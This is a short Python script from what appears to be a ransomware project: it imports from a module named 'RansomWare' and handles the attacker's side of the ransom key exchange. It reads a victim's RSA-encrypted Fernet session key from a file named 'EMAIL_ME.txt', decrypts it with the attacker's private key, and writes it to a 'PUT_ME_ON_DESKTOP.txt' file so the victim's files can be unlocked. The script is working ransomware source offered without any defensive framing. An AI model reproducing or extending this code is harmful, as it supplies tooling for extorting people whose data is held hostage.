# Python Imports
import os

# Framework Imports
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# Local Imports
from RansomWare import PROJECT_PATH

sysRoot = os.path.expanduser('~')
desktop = f"{sysRoot}\\Desktop"
print(sysRoot)

with open(f'{PROJECT_PATH}\\EMAIL_ME.txt', 'rb') as f:
    enc_fernet_key = f.read()
    print(enc_fernet_key)

# Private RSA key
private_key = RSA.import_key(open('private.pem').read())

# Private decrypter
private_crypter = PKCS1_OAEP.new(private_key)

# Decrypted session key
dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
with open(f'{desktop}\\PUT_ME_ON_DESKTOP.txt', 'wb') as f:
    f.write(dec_fernet_key)

print(f'> Private key: {private_key}')
print(f'> Private decrypter: {private_crypter}')
print(f'> Decrypted fernet key: {dec_fernet_key}')
print(f'> Decryption Completed')
